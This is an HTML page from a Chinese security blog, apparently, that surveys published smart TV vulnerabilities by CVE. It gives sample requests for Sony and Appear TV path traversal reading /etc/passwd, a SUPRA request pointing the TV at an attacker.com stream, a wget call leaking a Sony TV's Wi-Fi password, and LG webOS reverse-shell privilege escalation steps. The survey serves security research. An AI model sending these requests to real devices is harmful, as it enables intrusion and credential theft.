@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="智能电视漏洞汇总最近在测试某大厂的智能电视中遇到了不瓶颈，毕竟是第一次专注的研究智能电视，对电视的了解还不够深。挖不动烦躁的时候，就回头想想曾经看过的智能电视的漏洞，记忆都很零散，今天把智能电视曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。 命令注入漏洞某电视名称命令注入某电视名称重命名使用反引号可注入任意命令。文章中并没有没有说细节吗，猜测是前台设置的电视名称，后端应该是使用系统命令将电视">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能电视漏洞汇总">
+<meta property="og:url" content="http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="Delikely&#39;s Blog">
+<meta property="og:description" content="智能电视漏洞汇总最近在测试某大厂的智能电视中遇到了不瓶颈，毕竟是第一次专注的研究智能电视，对电视的了解还不够深。挖不动烦躁的时候，就回头想想曾经看过的智能电视的漏洞，记忆都很零散，今天把智能电视曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。 命令注入漏洞某电视名称命令注入某电视名称重命名使用反引号可注入任意命令。文章中并没有没有说细节吗，猜测是前台设置的电视名称，后端应该是使用系统命令将电视">
+<meta property="og:locale">
+<meta property="og:image" content="http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/smart_tv_sleeppng.jpg">
+<meta property="og:image" content="http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/tcl-directory-file-structure-vulnerability.png">
+<meta property="article:published_time" content="2021-04-10T05:05:44.000Z">
+<meta property="article:modified_time" content="2021-04-30T03:17:11.000Z">
+<meta property="article:author" content="Delikely">
+<meta property="article:tag" content="IOT">
+<meta property="article:tag" content="TV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/smart_tv_sleeppng.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/rice.svg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/rice.svg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/rice.png">
+          
+        
+    
+    <!-- title -->
+    <title>智能电视漏洞汇总</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body class="max-width mx-auto px3">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/2018/04/11/about/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Proyectos</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/04/16/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2%E4%B9%8B-Getshell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/04/01/hvv-%E7%BA%A2%E9%98%9F%E4%BD%95%E5%BF%85%E8%BF%9B%E6%9C%BA%E6%88%BF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
+      <span id="i-top" class="info" style="display:none;">Arriba</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&text=智能电视漏洞汇总"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&is_video=false&description=智能电视漏洞汇总"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=智能电视漏洞汇总&body=Check out this article: http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&title=智能电视漏洞汇总"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikey.github.io/2021/04/10/%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/&name=智能电视漏洞汇总&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%99%BA%E8%83%BD%E7%94%B5%E8%A7%86%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">智能电视漏洞汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">命令注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%90%E7%94%B5%E8%A7%86%E5%90%8D%E7%A7%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">某电视名称命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B9%90%E8%A7%86%E7%94%B5%E8%A7%86%E5%88%A9%E7%94%A8-UPnP-%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">乐视电视利用 UPnP 安装应用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">目录遍历漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TCL-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-CVE-2020-27403"><span class="toc-number">1.2.1.</span> <span class="toc-text">TCL 目录遍历(CVE-2020-27403)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sony-Smart-TV-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%EF%BC%88CVE-2019-10886%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">Sony Smart TV 目录遍历（CVE-2019-10886）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Appear-TV-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%EF%BC%88CVE-2018-7539%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">Appear TV  目录遍历（CVE-2018-7539）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LG-webOS-OS-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">LG webOS OS 任意文件覆盖提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">拒绝服务漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Sony-BRAVIA-%E7%94%B5%E8%A7%86-TCP-%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%EF%BC%88CVE-2019-11890%EF%BC%89"><span class="toc-number">1.4.1.</span> <span class="toc-text">Sony BRAVIA 电视  TCP 泛洪攻击（CVE-2019-11890）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADB"><span class="toc-number">1.5.1.</span> <span class="toc-text">ADB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUPRA%E6%99%BA%E8%83%BD%E4%BA%91%E7%94%B5%E8%A7%86%E8%A7%86%E9%A2%91%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-12477%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">SUPRA智能云电视视频劫持漏洞（CVE-2019-12477）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Sony-Smart-TV-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.5.3.</span> <span class="toc-text">Sony Smart TV 信息泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        智能电视漏洞汇总
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Delikely's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2021-04-10T05:05:44.000Z" itemprop="datePublished">2021-04-10</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/IOT/" rel="tag">IOT</a>, <a class="tag-link-link" href="/tags/TV/" rel="tag">TV</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="智能电视漏洞汇总"><a href="#智能电视漏洞汇总" class="headerlink" title="智能电视漏洞汇总"></a>智能电视漏洞汇总</h2><p>最近在测试某大厂的智能电视中遇到了不瓶颈，毕竟是第一次专注的研究智能电视，对电视的了解还不够深。挖不动烦躁的时候，就回头想想曾经看过的智能电视的漏洞，记忆都很零散，今天把智能电视曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。</p>
+<h3 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h3><h4 id="某电视名称命令注入"><a href="#某电视名称命令注入" class="headerlink" title="某电视名称命令注入"></a>某电视名称命令注入</h4><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/hacking-smart-tv-command-injection/">某电视</a>名称重命名使用反引号可注入任意命令。文章中并没有没有说细节吗，猜测是前台设置的电视名称，后端应该是使用系统命令将电视名称设置成 hostname ，由于没有过滤从而造成了任意命令执行。</p>
+<p><img src="smart_tv_sleeppng.jpg" alt="The Sleep option on the Smart TV set" style="zoom:50%;" /></p>
+<h4 id="乐视电视利用-UPnP-安装应用"><a href="#乐视电视利用-UPnP-安装应用" class="headerlink" title="乐视电视利用 UPnP 安装应用"></a>乐视电视利用 UPnP 安装应用</h4><p>18年 GeekPwn 上的<a target="_blank" rel="noopener" href="https://www.sohu.com/a/279830384_609380">乐视电视</a>任意应用安装也比较有意思。利用 UPnP 提供的下载服务下载并安装应用，之前并没有想到还有这种操作。现在电视使用的大多使用第三方的投屏服务，这种骚操作的机会少了。</p>
+<p>发现 UPnP 协议中通过 XML 文件声明告知手机控制端自身提供原用于遥控器应用更新下载服务可被滥用，通过控制端连接电视后即可发送 XML Message 的方式请求 DownLoadFile 的服务，电视内部收到服务请求未进行有效过滤即进行下载 APK 动作。下载 APK 应用后，发送消息请求电视 DLNA 服务向电视 EUI 系统发送特定内容广播。利用电视广播服务，调用系统内部静默安装服务，并对 Activity 进行调用。</p>
+<h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h4 id="TCL-目录遍历-CVE-2020-27403"><a href="#TCL-目录遍历-CVE-2020-27403" class="headerlink" title="TCL 目录遍历(CVE-2020-27403)"></a>TCL 目录遍历(CVE-2020-27403)</h4><p><a target="_blank" rel="noopener" href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">TCL 电视</a> 7989 开放了 web 服务，未授权用户能够访问电视中的文件。</p>
+<p><img src="tcl-directory-file-structure-vulnerability.png" alt="TCL directory file structure vulnerability" style="zoom:50%;" /></p>
+<h4 id="Sony-Smart-TV-目录遍历（CVE-2019-10886）"><a href="#Sony-Smart-TV-目录遍历（CVE-2019-10886）" class="headerlink" title="Sony Smart TV 目录遍历（CVE-2019-10886）"></a>Sony Smart TV 目录遍历（CVE-2019-10886）</h4><p>索尼智能电视 “图片共享” 应用没有限制目录，从而可以读取任意文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># curl -v http://192.168.1.102:10000/contentshare/image/default.prop</span></span><br><span class="line">Trying 192.168.1.102...</span><br><span class="line">TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">Connected to 192.168.1.102 (192.168.1.102) port 10000 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /contentshare/image/default.prop HTTP/1.1</span><br><span class="line">&gt; Host: 192.168.1.102:10000 </span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: /</span><br><span class="line">&gt;</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Length: 591</span><br><span class="line">&lt; Content-Type: application/octet-stream</span><br><span class="line">&lt;</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># ADDITIONAL_DEFAULT_PROPERTIES</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">ro.secure=1</span><br><span class="line">security.perf_harden=1</span><br><span class="line">ro.allow.mock.location=0</span><br><span class="line">ro.debuggable=0 ro.zygote=zygote32</span><br><span class="line">dalvik.vm.image-dex2oat-Xms=64m</span><br><span class="line">dalvik.vm.image-dex2oat-Xmx=64m</span><br><span class="line">dalvik.vm.dex2oat-Xms=64m dalvik.vm.dex2oat-Xmx=512m</span><br><span class="line">ro.dalvik.vm.native.bridge=0 debug.atrace.tags.enableflags=0 </span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># BOOTIMAGE_BUILD_PROPERTIES </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">ro.bootimage.build.date=2016? 11? 14? ??? 15:34:56 JST ro.bootimage.build.date.utc=1479105296     ro.bootimage.build.fingerprint=Sony/BRAVIA_ATV2_PA/BRAVIA_ATV2:6.0.1/MMB29V.S50/1.6.0.06.14.0.00:user/release-keys persist.sys.usb.config=none</span><br><span class="line"></span><br><span class="line">Closing connection 0 </span><br></pre></td></tr></table></figure>
+<h4 id="Appear-TV-目录遍历（CVE-2018-7539）"><a href="#Appear-TV-目录遍历（CVE-2018-7539）" class="headerlink" title="Appear TV  目录遍历（CVE-2018-7539）"></a>Appear TV  目录遍历（CVE-2018-7539）</h4><p>Appear TV  XC5000 、XC5100 电视的 “Maintenance Center” 服务对外开放了WEB服务，监听在 8088 端口。</p>
+ <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /../../../../../../../../../../../../etc/passwd</span><br><span class="line">Host: x.x.x.x:8088</span><br><span class="line">User-Agent: curl/7.56.1</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1110</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=utf-8</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=3600</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>fuzzd/0.1.1</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br></pre></td></tr></table></figure>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="LG-webOS-OS-任意文件覆盖提权"><a href="#LG-webOS-OS-任意文件覆盖提权" class="headerlink" title="LG webOS OS 任意文件覆盖提权"></a><a target="_blank" rel="noopener" href="https://blog.recurity-labs.com/2021-02-03/webOS_Pt1.html">LG webOS OS</a> 任意文件覆盖提权</h4><p><strong>任意文件覆盖</strong>：luna-send-pub 命令调用 downloadmanager 服务可以下载文件到本地的任意位置，且文件属主为 root 。</p>
+<p>系统中的 /etc/luna-services2/ls-hubd.conf 配置文件中定义了可执行脚本，脚本在点数开机的之后会被 Root 调用指令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Dynamic Services]</span><br><span class="line">ExecPrefix&#x3D;&#x2F;usr&#x2F;sbin&#x2F;setcpushares-ls2</span><br><span class="line">LaunchTimeout&#x3D;300000</span><br></pre></td></tr></table></figure>
+<p>于是，可以通过覆盖 ls-hubd.conf  配置文件，将 ExecPrefix 的值设定为自定义脚本所在的路径。当电视重启之后，就能够提升到 Root 权限了。</p>
+<ol>
+<li>在本地创建 ls-hubd.conf 文件；</li>
+<li>在电视中编写反弹 shell 脚本；</li>
+<li>使用 luna-send-pub 下载 ls-hubd.conf 覆盖原有文件；</li>
+<li>本地监听，然后重启服务之后就拿到了具备 Root 权限了 Shell 了。</li>
+</ol>
+<h3 id="拒绝服务漏洞"><a href="#拒绝服务漏洞" class="headerlink" title="拒绝服务漏洞"></a>拒绝服务漏洞</h3><h4 id="Sony-BRAVIA-电视-TCP-泛洪攻击（CVE-2019-11890）"><a href="#Sony-BRAVIA-电视-TCP-泛洪攻击（CVE-2019-11890）" class="headerlink" title="Sony BRAVIA 电视  TCP 泛洪攻击（CVE-2019-11890）"></a>Sony BRAVIA 电视  TCP 泛洪攻击（CVE-2019-11890）</h4><p>Sony 电视泛洪攻击电视会重启。原来电视也怕 TCP 泛洪攻击，还以为只有像工控的这种低性能设备重启的概率会高一些。 </p>
+<p>此外，还有不少其他形式的 DOS，如缓冲器溢出等，由于没有公布细节，这里就不讲了。</p>
+<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><h4 id="ADB"><a href="#ADB" class="headerlink" title="ADB"></a>ADB</h4><ul>
+<li>CVE-2019-6005：<a target="_blank" rel="noopener" href="http://jvn.jp/en/jp/JVN17127920/index.html">KDDI Smart TV Box</a> 默认在 5555 端口开放了 ADB。</li>
+<li>CVE-2019-9871：<a target="_blank" rel="noopener" href="https://github.com/cvereveal/CVEs/tree/master/CVE-2019-9871">Jector Smart TV FM-K75</a> 默认在 5555 端口开放了 ADB，且权限为 root。</li>
+</ul>
+<h4 id="SUPRA智能云电视视频劫持漏洞（CVE-2019-12477）"><a href="#SUPRA智能云电视视频劫持漏洞（CVE-2019-12477）" class="headerlink" title="SUPRA智能云电视视频劫持漏洞（CVE-2019-12477）"></a>SUPRA智能云电视视频劫持漏洞（CVE-2019-12477）</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/208520.html">SUPRA</a> 电视开放了 80 端口，提供的功能包含自定义的投屏服务，但没有验证用户和资源的合法性，于是未授权用户就可以播放任意内容。</p>
+<p>向电视设备插入任意视频播放的构造请求如下。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/remote/media_control?action=setUri&amp;uri=http://attacker.com/fake_broadcast_message.m3u8</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.155</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+<p>现在，电视开放的端口还挺多的。尤其是现在有的家电厂商希望把智能电视打造为智能家居的中枢，肩负的任务也越来越多，但不少的服务没有基本的授权验证。</p>
+<h4 id="Sony-Smart-TV-信息泄露"><a href="#Sony-Smart-TV-信息泄露" class="headerlink" title="Sony Smart TV 信息泄露"></a>Sony Smart TV 信息泄露</h4><p>Sony Smart TV 在 10000 端口开放了 WEB 服务，未授权用户访问 /contentshare 页面，可以获取无线网络的明文密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget -qO- --post-data=&#x27;&#123;&quot;id&quot;:80,&quot;method&quot;:&quot;getContentShareServerInfo&quot;,&quot;params&quot;:[],&quot;version&quot;:&quot;1.0&quot;&#125;&#x27; http://[ip_tv]:10000/contentshare/</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:[&#123;<span class="string">&quot;ssid&quot;</span>:<span class="string">&quot;DIRECT-GD-BRAVIA&quot;</span>,<span class="string">&quot;keyType&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&quot;8362tbwX&quot;</span>,<span class="string">&quot;deviceName&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;http:\/\/192.168.49.1&quot;</span>,<span class="string">&quot;touchPadRemote&quot;</span>:<span class="string">&quot;notSupported&quot;</span>&#125;],<span class="string">&quot;id&quot;</span>:80&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>智能电视形似一台有着巨大屏幕的手机，与手机不同的是智能电视作为服务端提供各类服务。由于电视厂家有各自生态的考量，应用五花八门，分析纰漏出来的漏洞，不少是权限问题，各种服务的认证问题还是重中之重。从CVE 、CNVD 中的数据来看，拒绝服务最多，然后是目录遍历、命令执行，最后是信息泄露、提权等。</p>
+<p>首发于：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/trYEzCCfd8R7ppWVs-Zp9Q">火线Zone</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inicio</a></li>
+         
+          <li><a href="/2018/04/11/about/">Acerca de</a></li>
+         
+          <li><a href="/archives/">Articulos</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Proyectos</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
